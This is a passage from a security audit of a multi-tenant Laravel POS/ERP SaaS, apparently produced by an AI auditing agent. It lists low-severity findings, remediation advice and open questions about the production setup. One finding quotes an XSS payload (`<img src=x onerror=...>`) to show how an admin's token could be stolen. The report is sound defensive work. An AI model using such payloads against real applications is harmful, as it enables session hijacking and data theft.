- **Evidence:** If the host is not a central domain and matches no tenant domain or slug, the middleware falls through to $next without initializing tenancy and without returning 404. ApiTokenAuth.php:74-79 then sets the super_admin and central guards (provider central_users / CentralUser) to an App\Models\User. All operational routes (users, roles, settings, invoices) are reachable in central context, so /api/v1/users can create and assign roles to central users.
- **Impact:** Requests to an unlisted alias (server IP, a typo subdomain) operate on the central DB. A central user with users.manage can create central super_admin users. Operational endpoints produce 500s that leak schema details when APP_DEBUG=true (.env.example:4).
- **Recommendation:** Return 404 when a non-central host resolves to no tenant. Split routes into a central-only group (super-admin, resolver) and a tenant-only group that requires tenancy()->initialized and aborts otherwise.

### 46. [LOW] Plan, PlanFeature and Subscription are central models without a pinned connection
- **Location:** `D:\projects\sroor\backend\app\Models\Plan.php:8`
- **Effort:** S
- **Evidence:** getConnectionName() exists only in AppVersion.php:16 and CentralUser.php. Plan, PlanFeature and Subscription extend Model with no connection. Tenant and Domain get their connection from stancl, and relations from Tenant inherit the parent connection, so $tenant->plan works. Direct Plan::/Subscription:: queries in tenant context would hit the tenant DB.
- **Impact:** This is a correctness risk, not an exploit: feature gating or super-admin code calling Plan::find() while a tenant is initialized (which happens for the super-admin API group in api.php) fails with 'table not found', or, if a tenant ever creates such a table, reads tenant-controlled plan data.
- **Recommendation:** Add getConnectionName() returning config('tenancy.database.central_connection') to Plan, PlanFeature and Subscription, or use stancl's CentralConnection trait.

### 47. [LOW] 20 of 21 Policies are dead code; authorization is copy-pasted inline checks
- **Location:** `D:\projects\sroor\backend\app\Policies\InvoicePolicy.php:12`
- **Effort:** L
- **Evidence:** There are no `$this->authorize(`, `Gate::policy` or `->can('view'|'update', $model)` calls anywhere except StoreCategoryRequest and UpdateCategoryRequest (CategoryPolicy). Every other controller repeats `if ($user && !$user->hasRole('admin') && !$user->can(...)) return 403`. StorePolicy::viewAny returns true. TenantPolicy (hasRole('super_admin')) is never used. Note the `$user &&` pattern skips the check when the user is null; that is safe only because ApiTokenAuth always sets a user.
- **Impact:** Checks drift between endpoints. For example, Invoice show allows pos.access and InvoicePolicy::delete is never reached. Policies give a false sense of coverage in reviews, and a future route outside ApiTokenAuth would silently skip the inline checks.
- **Recommendation:** Either wire the Policies (authorize() in FormRequests and controllers, including record-level store checks in view/update/delete) or delete them. Replace the `$user && ...` pattern with a fail-closed check.

### 48. [LOW] routes/tenant.php duplicates api.php with different permissions and 13 routes point to non-existent methods
- **Location:** `D:\projects\sroor\backend\routes\tenant.php:88`
- **Effort:** S
- **Evidence:** The SPA uses baseURL '/api/v1' (resources/js/Services/api.js:7), so api.php is what serves production SPA traffic. tenant.php is loaded by TenancyServiceProvider.php:116-121 as session-auth web routes on tenant domains. It references missing methods: InvoiceController::edit/update/destroy/restore; DailyJournalController::openShift/closeShift/storeExpense; SettingController::sendDailySummaryTelegram/sendBackupTelegram/downloadBackup/clearCache; PurchaseController::create; ReturnController::create. Permission disagreements: tenant.php gates customers/suppliers/expenses lists with *.manage, settings and users with roles.manage, and Telegram test with roles.manage (tenant.php:239). api.php has no `can:` on these, but the controllers check inline. For example, the SettingController.php:103 check is admin, roles.manage or settings.manage, so /settings/telegram/test in api.php is NOT unprotected. Invoice print routes (tenant.php:60-74) have no auth.
- **Impact:** There are two authorization surfaces to keep in sync, a session-auth surface the SPA does not use, which widens the attack surface (CSRF-protected but stale), and endpoints that 500. The unauthenticated print routes are covered by the routes/web.php sub-area.
- **Recommendation:** Remove the duplicated API-style routes from tenant.php, keeping only the SPA shell, login and impersonation. Move print and export routes under ApiTokenAuth or signed URLs with explicit permission and store checks.

### 49. [LOW] Trash force-delete permanently erases return documents and expenses
- **Location:** `D:\projects\sroor\backend\app\Actions\Trash\ForceDeleteTrashRecordAction.php:27`
- **Effort:** S
- **Evidence:** The type whitelist includes 'expenses' and 'returns' with forceDelete(). It is gated only by trash.access or admin (TrashController.php:79). Invoices are correctly excluded.
- **Impact:** A user with trash.access can permanently remove financial documents (returns and expenses) after soft-deleting them, which erases the audit trail. This conflicts with the rule against physically deleting sensitive data.
- **Recommendation:** Remove 'returns' and 'expenses' from force-delete, or restrict it to the tenant owner with an activity-log entry and a retention window.

### 50. [LOW] Hardcoded `user->id === 1` treated as global store admin
- **Location:** `D:\projects\sroor\backend\app\Http\Controllers\Api\StoreController.php:45`
- **Effort:** S
- **Evidence:** `$isGlobalAdmin = $user->id === 1 || $user->hasRole('super-admin') || ...` in index (line 45) and switchStore (line 225). The role name 'super-admin' (with a hyphen) does not exist; the seeded role is 'super_admin'.
- **Impact:** Whoever holds id 1 in a tenant DB keeps all-store access even after being demoted to cashier.
- **Recommendation:** Drop the id check and the dead role name. Rely on stores.manage or admin.

### 51. [LOW] ReportPrintController is dead code with no auth; the reports/print closure is unauthenticated
- **Location:** `D:\projects\sroor\backend\app\Http\Controllers\ReportPrintController.php:17`
- **Effort:** S
- **Evidence:** No route references ReportPrintController; grep only finds the class itself. The routed web.php:180-252 /reports/print closure has no auth. It currently renders only static, hard-coded rows plus the store name from `Store::find($storeId)`, so little data leaks today. The controller contains full sales, customer, treasury and P&L queries with tamperable store_id that would leak if re-wired as-is.
- **Impact:** Little exposure today: at most store names. There is a high risk that someone wires ReportPrintController to the existing unauthenticated route and exposes the full P&L.
- **Recommendation:** Either delete ReportPrintController or route it inside tenant.php `auth` + `can:reports.view` with validated store scoping. Remove the placeholder closure.

### 52. [LOW] Unescaped Blade output and v-html sinks (currently not user-controlled)
- **Location:** `D:\projects\sroor\backend\resources\views\layouts\print-report-a4.blade.php:138`
- **Effort:** S
- **Evidence:** `{!! $cell['value'] !!}` renders table cells. The only producer (web.php:224-246) uses constant strings, but cells naturally hold user data such as customer and item names once real report rows are added. app.blade.php:67 injects `json_encode($initialTranslations, JSON_UNESCAPED_SLASHES)` without JSON_HEX_TAG; the source is static lang files. Pagination.vue:70/75 uses `v-html="link.label"`, which is fed by paginator labels. All other print templates use escaped `{{ }}`.
- **Impact:** No exploitable path today. As soon as report rows include customer or item names, a customer named `<img src=x onerror=...>` would run script in the admin's session and could steal the localStorage bearer token.
- **Recommendation:** Use `{{ }}` for cell values (render formatting via classes). Add JSON_HEX_TAG|JSON_HEX_AMP to the json_encode in app.blade.php. Replace v-html in Pagination with text interpolation of decoded labels.

### 53. [LOW] No automated tests for store isolation
- **Location:** `D:\projects\sroor\backend\tests\Feature\Api`
- **Effort:** M
- **Evidence:** X-Store-Id appears in six API tests (Auth, DailyJournal, Dashboard, PermissionsAndContext, SystemContext, Treasury), but grep finds no assertForbidden/403 test tied to a foreign store.
- **Impact:** The store-isolation regressions above went unnoticed, and fixes could regress silently.
- **Recommendation:** Add feature tests: a cashier assigned to store A gets 403 when calling invoices, shifts, expenses, treasury, dashboard and transfers with store B; unauthenticated GET on print/export routes returns a 302 or 401.

### 54. [LOW] Insecure-by-default env templates and session cookie flags; CORS/Sanctum configs not published
- **Location:** `D:/projects/sroor/backend/.env.example:4`
- **Effort:** S
- **Evidence:** .env.example and backend/.env.example set APP_ENV=local, APP_DEBUG=true and LOG_LEVEL=debug. With APP_ENV=local, Telescope records everything and hideSensitiveRequestDetails() is skipped (TelescopeServiceProvider:39). config/session.php: secure=env('SESSION_SECURE_COOKIE') (null), encrypt=false, same_site=lax, http_only=true. config/cors.php is missing, so the framework default applies: paths api/*, allowed_origins ['*'], supports_credentials=false. config/sanctum.php is missing, so the default stateful localhost list applies, plus expiration=null. The deploy scripts write APP_DEBUG=false, which is good. .env.e2e holds only a test APP_KEY and sqlite settings (APP_ENV=testing, APP_DEBUG=true), not production secrets.
- **Impact:** A server bootstrapped by copying .env.example runs with debug pages (stack traces, env values) and full Telescope capture. The session cookie is not marked Secure unless the env var is set. CORS '*' lets any origin call the API with a stolen bearer token. This is not exploitable alone, but it widens the blast radius of the other findings.
- **Recommendation:** Make .env.example production-safe (APP_ENV=production, APP_DEBUG=false, LOG_LEVEL=warning, SESSION_SECURE_COOKIE=true, TELESCOPE_ENABLED=false) and keep a separate .env.local.example. Publish config/cors.php with an explicit origin allow-list (the SPA domains, capacitor://localhost, the Electron origin). Publish config/sanctum.php with an expiration.

### 55. [LOW] Repo hygiene: compiled Blade views, bootstrap/cache, __pycache__ and screenshots tracked at repo root
- **Location:** `D:/projects/sroor/storage/framework/views`
- **Effort:** S
- **Evidence:** git ls-files includes about 60 storage/framework/views/*.php, bootstrap/cache/packages.php and services.php, __pycache__/bump_version.cpython-312.pyc, and after_submit.png, before_submit.png and modal_failure.png at the repo root (outside backend/). desktop/electron_debug.log is ignored (.gitignore:103) and not tracked. No *.apk/*.aab/*.sqlite/*.keystore/*.pem and no test-results/playwright-report are tracked, which contradicts the lead's note about a committed APK.
- **Impact:** Stale compiled views can leak internal markup or data captured in screenshots, and add noise to secret scanning. Low risk.
- **Recommendation:** Remove them from the index and add the root-level storage/, bootstrap/cache/, __pycache__/ and *.png test artifacts to .gitignore.

### 56. [LOW] Logo uploads are validated but silently dropped; tenant-suffixed 'public' disk breaks APK/EXE downloads on tenant hosts
- **Location:** `D:\projects\sroor\backend\app\Actions\Settings\UpdateSettingsAction.php:16`
- **Effort:** M
- **Evidence:** UpdateSettingsRequest validates logo_file, logo_light_file and logo_dark_file as image|max:4096 (Laravel 13's image rule excludes SVG by default, which is good). UpdateSettingsAction skips those keys and nothing stores them; the only storeAs in app/ is in CreateAppVersionAction. config/tenancy.php enables FilesystemTenancyBootstrapper for the 'local' and 'public' disks with suffix_storage_path=true. Calling DownloadLatestApkAction on a tenant host (Electron/Capacitor load tenant subdomains, which ResolveApiTenancy initializes) looks in the tenant-suffixed public disk, while super-admin uploads land in the central disk. The download then falls through to the public_path fallbacks or returns 404. A super-admin upload made from a tenant host would be written into that tenant's storage.
- **Impact:** There is no upload attack surface today (no file is written), but branding in this sellable SaaS doesn't work. The update channel silently serves stale fallback binaries or 404s on tenant domains, which pushes operators toward ad-hoc public/ binaries (see the integrity finding).
- **Recommendation:** When logo storage is implemented, use $file->store('branding', 'public') under tenancy (server-generated names, per-tenant disk), serve logos through tenant_asset or a controller, and keep SVG disallowed. Use an explicit central disk such as Storage::build or a 'central_public' disk that is not in tenancy.filesystem.disks for app_versions in both upload and download.

### 57. [LOW] Loose version constraints and unaudited PHP dependencies
- **Location:** `D:\projects\sroor\backend\composer.json:12`
- **Effort:** S
- **Evidence:** composer.json has "laravel/sanctum": "*" and "laravel/telescope": "*". composer.lock is tracked (framework v13.25.0, sanctum v4.3.3, telescope v5.22.1), so installs are reproducible, but `composer update` could pull any future major. composer audit could not run because the composer binary is not on PATH in this environment. npm audit --omit=dev in backend/ found 10 issues, including axios 1.19.0 (high, prototype-pollution gadgets; fixed in later 1.x), @vue/server-renderer <3.5.42 and @xmldom/xmldom (via Capacitor CLI).
- **Impact:** An uncontrolled major upgrade of the auth package (Sanctum) or debug tooling (Telescope) could change token or auth semantics, and the known npm advisories stay unpatched in shipped bundles.
- **Recommendation:** Pin to ^4.3 for sanctum and ^5.22 for telescope. Run `composer audit` and `npm audit --omit=dev` in CI and fail on high/critical. Run `npm audit fix` in backend/ now (axios, @capacitor/android, vue).

### 58. [INFO] Vite 'hot' file tracked in public/
- **Location:** `D:\projects\sroor\backend\public\hot:1`
- **Effort:** S
- **Evidence:** backend/public/hot is git-tracked and contains http://localhost:5173.
- **Impact:** If it is deployed, any remaining @vite Blade output would point browsers at a localhost dev server: broken assets in production, and on a shared POS machine any process listening on 5173 could inject script.
- **Recommendation:** git rm --cached backend/public/hot and add it to .gitignore.

## Open questions
- Has the production central DB been seeded with DatabaseSeeder (default super-admin passwords), and have those passwords been rotated? This decides whether the central-fallback finding is directly exploitable today.
- Does the production central DB contain legacy operational users with the 'admin' role (from the original single-tenant Sroor DB)? Each of them currently has admin access to every tenant through the login and token fallbacks.
- What is CACHE_STORE in production (database, file or redis)? With 'file', the cross-tenant cache leak still applies: one shared directory and keys without tenant ids. Confirm whether CacheTenancyBootstrapper was disabled on purpose.
- Is quick-login meant as a shared-terminal POS feature? If so, which device trust model does the product want (device-registered token plus a per-user PIN)?
- Are any production tenants already marked suspended or expired? Those tenants can still use the API today.
- In production, does the super-admin panel authenticate against the central DB with no X-Tenant header (central host)? If so, fixing both criticals can be as simple as rejecting /api/v1/super-admin/* whenever tenancy()->initialized is true.
- Has any production tenant DB already got a user holding the 'super_admin' role, or a user whose phone matches the allowlist? An audit query per tenant (using Tenant::cursor() and $tenant->run(), read-only) should be run by the owner. I did not touch any real DB.
- ImpersonateTenantAction (tenancy()->impersonate) exists but is not wired to any route I found. The public GET /impersonate/{token} relies on stancl's token TTL and tenant match. Is impersonation meant to be live?
- Is the session-based tenant.php surface (/login, /customers, /users... on tenant domains) used by Electron or Android, or is it legacy? If it is legacy, removing it closes 13 broken routes and one duplicate authorization surface.
- I did not verify whether the POS/Invoice service re-prices lines from the item's price tier anywhere downstream of InvoiceService.php:72. The money and stock sub-agent should confirm the client-trusted unit_price finding.
- Does the production central DB (Hostinger) still contain legacy single-tenant tables (invoices, customers, items) from the pre-SaaS app? If yes, the web.php export routes (customers/{id}/export-csv, items/export-csv, items/{id}/movements/print) are an anonymous data leak right now, not a latent one. I could not verify this without connecting to the DB.
- Are the hard-coded phone numbers in Gate::before already present as users in any tenant DB? If an existing tenant user already holds one, they already have platform-wide super-admin.
- Which session driver is used in production? If it is 'database', web routes without tenancy write sessions to the central DB, while tenant routes use the tenant DB. That changes whether the unauthenticated /store/switch session value reaches tenant-route users.
- Route ordering: web.php's catch-all `/{any?}` (where any = .*) registers before tenant.php. Tenant-only GET routes that don't also exist in web.php (e.g. /pos, /invoices/{id}, /spa/*) may be shadowed by the SPA catch-all. This needs a functional check on a tenant domain; it does not affect the security conclusions above.
- Are the GitHub repos kamalsroor1/sroor-cofe-erp and kamalsroor1/erp-hub private? The SSH password and webhook token are on origin/main and erp-hub/main. I did not contact GitHub to check.
- The permission system blocked deeper inspection of backups/*.sql, so I could not confirm whether users.api_token values, Authorization headers in telescope_entries, or plaintext passwords are inside the dumps. Someone with access should check, and treat all tokens as compromised either way.
- Are the APP_KEYs in deploy_root_baraa.py:85 and deploy_to_sroor_subdomain.py:54 (the latter also in backend/phpunit.xml:22) the live production keys? If so, encrypted data and sessions need a rotation plan.
- Is update_webhook.php still deployed in public_html? read_webhook.py implies it is, but the root .htaccess rewrites everything to public/, so actual reachability depends on server layout. I did not send any request to production.
- Which DB do web routes (/telescope-access, /telescope, /pulse) resolve users against in production, the central DB or a tenant DB through a domain-identification middleware? That determines exactly which 'admin' users can reach Telescope.
- Is the quick-login endpoint used by the mobile/desktop clients (e.g. a cashier switch screen)? If so, removing it needs a PIN-based replacement in the same release.
- composer audit could not be run because composer is not on PATH in this shell. Please run `composer audit` in backend/ to complete the PHP dependency check.
- Is /api/v1/auth/quick-login intentionally deployed on production tenant hosts? Check access logs for 'api_quick_login' activity-log entries to see whether it has been used by unknown IPs.
- Do the X-Store-Id and X-Tenant headers set from localStorage (Services/api.js:25-33) get validated server-side against the token's user and stores? This is the access-control sub-area and should be confirmed there.
- Is the update_webhook.php secret also referenced in .github/workflows/deploy.yml or the root deploy_*.py scripts? It should be rotated everywhere and purged from history.
- routes/tenant.php:240-245 reference SettingController methods that don't exist (sendDailySummaryTelegram, downloadBackup, clearCache), so those routes would throw errors. Which route file is actually authoritative in production?